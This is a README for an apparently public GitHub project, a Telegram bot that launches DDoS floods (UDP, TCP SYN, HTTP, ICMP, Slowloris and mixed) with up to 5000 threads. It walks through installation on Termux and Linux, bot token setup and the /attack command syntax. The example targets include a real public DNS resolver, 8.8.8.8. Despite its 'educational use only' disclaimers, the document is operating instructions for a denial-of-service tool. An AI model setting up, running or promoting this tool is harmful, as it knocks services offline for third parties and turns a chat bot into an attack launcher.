


# Telegram DDoS Bot 

## Developed by Abhishek

---

## DISCLAIMER

This tool is for educational and authorized testing only. Unauthorized use against any system without permission is ILLEGAL. The developer assumes NO LIABILITY for misuse. You are solely responsible for your actions.

---

## FEATURES

- 6 attack methods (UDP, TCP, HTTP, ICMP, Slowloris, Mixed)
- Multi-threaded attacks (up to 5000 threads)
- Admin authentication system
- Attack logging with timestamps
- Concurrent attack support
- Real-time status monitoring
- Graceful attack stopping
- No external dependencies beyond requirements

---

## ATTACK METHODS

| Method | Description |
|--------|-------------|
| udp | UDP flood with random packet sizes |
| tcp | TCP SYN flood with connection attempts |
| http | HTTP GET flood with random user agents |
| icmp | ICMP echo flood (ping flood) |
| slowloris | Slowloris attack keeping partial connections |
| mixed | Combined attack using random methods |

---

## INSTALLATION

### Termux

```bash
pkg update && pkg upgrade -y
pkg install python git -y
git clone https://github.com/abhieexploits/Telegram_DDoS_Bot.git
cd Telegram_DDoS_Bot
pip install -r requirements.txt
```

### Linux (Ubuntu/Debian)

```bash
sudo apt update
sudo apt install python3 python3-pip git -y
git clone https://github.com/abhieexploits/Telegram_DDoS_Bot.git
cd Telegram_DDoS_Bot
pip3 install -r requirements.txt
```

---

#### CONFIGURATION

###### Step 1: Get Bot Token

1. Open Telegram
2. Search @BotFather
3. Send /newbot
4. Choose name and username
5. Copy the token

###### Step 2: Get Admin ID

1. Open Telegram
2. Search @userinfobot
3. Send /start
4. Copy your user ID

###### Step 3: Edit config.json

```json
{
    "bot_token": "YOUR_BOT_TOKEN_HERE",
    "admin_ids": [YOUR_USER_ID_HERE],
    "max_attacks": 10,
    "log_level": "INFO"
}
```

---

RUNNING THE BOT

```bash
python bot.py
```

Or for Python3:

```bash
python3 bot.py
```

---

COMMANDS

User Commands

Command Description
/start Show welcome message
/help Show all commands
/methods List all attack methods
/attack Start an attack
/stop Stop an attack
/list Show active attacks
/status Show bot status
/about Show bot information

Admin Commands

Command Description
/broadcast Send message to all users
/stats Show detailed attack statistics

---

ATTACK USAGE

Syntax

```
/attack <target_ip> <target_port> <duration_seconds> <attack_type> <threads>
```

Examples

```bash
/attack 192.168.1.1 80 60 udp 1000
/attack 10.0.0.5 443 120 tcp 500
/attack example.com 8080 30 http 200
/attack 172.16.0.10 53 90 icmp 300
/attack 192.168.1.100 22 45 slowloris 50
/attack 8.8.8.8 80 60 mixed 1000
```

Parameters

Parameter Range Description
target_ip Valid IPv4 or domain Target address
target_port 1-65535 Target port
duration 1-3600 seconds Attack runtime
attack_type udp/tcp/http/icmp/slowloris/mixed Method to use
threads 1-5000 Concurrent threads

---

STOPPING AN ATTACK

List active attacks

```
/list
```

Stop specific attack

```
/stop ATTACK_ID
```

---

FILE STRUCTURE

```
Telegram_DDoS_Bot/
├── bot.py                 # Main bot file
├── requirements.txt       # Python dependencies
├── config.json           # Bot configuration
├── .gitignore            # Git ignore file
├── README.md             # This file
├── attacks/
│   ├── __init__.py
│   ├── udp_flood.py      # UDP attack
│   ├── tcp_flood.py      # TCP attack
│   ├── http_flood.py     # HTTP attack
│   ├── icmp_flood.py     # ICMP attack
│   ├── slowloris.py      # Slowloris attack
│   └── mixed_attack.py   # Mixed attack
└── utils/
    ├── __init__.py
    ├── logger.py         # Logging system
    ├── validators.py     # Input validation
    └── config.py         # Config loader
```

---

DEPENDENCIES

```
pyTelegramBotAPI==4.15.0
requests==2.31.0
psutil==5.9.6
```

Install all with:

```bash
pip install -r requirements.txt
```

---

TROUBLESHOOTING

Issue: Bot not responding

Solution: Check token in config.json is correct

Issue: Attack not starting

Solution: Verify target IP and port are valid

Issue: Permission denied

Solution: Run without root or check file permissions

Issue: Module not found

Solution: Run pip install -r requirements.txt again

---

LOGGING

All attacks are logged in attack_logs.json:

```json
{
  "timestamp": "2026-05-03T10:30:00",
  "message": "Attack 1234567890 started by user on 192.168.1.1:80"
}
```

---

LEGAL NOTICE

This software is provided for educational purposes only. Using this tool against systems without explicit permission violates computer fraud laws in most jurisdictions. The author does not condone illegal activity and is not responsible for any misuse of this software.

---

VERSION HISTORY

Version Date Changes
2.0 2026-05-03 Added mixed attack, improved error handling
1.0 2026-04-01 Initial release with 3 attack methods

---

CONTACT

For issues: Open GitHub issue
For features: Submit pull request

---

LICENSE

Educational use only. Redistribution with credit allowed.

---

Version: 2.0
Last Updated: 2026-05-03
Compatible with: Python 3.7+
Supported OS: Linux, Termux, WSL

---

QUICK START COMMANDS

```bash
# Clone and setup
git clone https://github.com/abhieexploits/Telegram_DDoS_Bot.git
cd Telegram_DDoS_Bot
pip install -r requirements.txt

# Edit config with your token
nano config.json

# Run bot
python bot.py

# In Telegram send
/attack 192.168.1.1 80 30 udp 500
```

---
